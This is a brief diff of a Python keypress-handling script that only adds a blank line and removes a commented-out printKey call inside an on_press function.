@@ -34,6 +34,7 @@ countDelete = 0
 clicks_counter = 0
 imgPath = 'screenshot.jpg'
 
+
 def on_press(key):
     global lastThreeKeys, f
     if len(lastThreeKeys) == 3:
@@ -62,7 +63,6 @@ def on_press(key):
         printKey(key)
     except Exception as e:
         print(e)
-        # printKey(key)
 
 
 def printKey(key):
